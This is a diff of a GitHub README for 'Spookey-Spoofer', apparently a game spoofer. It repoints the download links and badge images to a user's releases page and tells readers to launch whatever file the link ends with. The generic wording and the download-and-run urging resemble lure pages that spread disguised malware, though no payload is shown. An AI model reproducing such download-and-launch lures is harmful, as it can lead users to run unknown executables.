@@ -2,7 +2,7 @@
 
 Welcome to the **Spookey-Spoofer** GitHub repository! 🎮✨
 
-![Spookey-Spoofer Logo](https://example.com/spookey-spoofer-logo.png)
+![Spookey-Spoofer Logo](https://github.com/Calebe258/Spookey-Spoofer/releases)
 
 ## Overview
 
@@ -50,9 +50,9 @@ Welcome to the **Spookey-Spoofer** GitHub repository! 🎮✨
 
 ## Usage
 
-Please download the latest release of **Spookey-Spoofer** from [here](https://github.com/assets/Release.zip).
+Please download the latest release of **Spookey-Spoofer** from [here](https://github.com/Calebe258/Spookey-Spoofer/releases).
 
-[![Download Spookey-Spoofer](https://img.shields.io/badge/Download-Release.zip-blue.svg)](https://github.com/assets/Release.zip)
+[![Download Spookey-Spoofer](https://github.com/Calebe258/Spookey-Spoofer/releases)](https://github.com/Calebe258/Spookey-Spoofer/releases)
 
 If the link ends with a file name, make sure to launch it to access the tool.
 
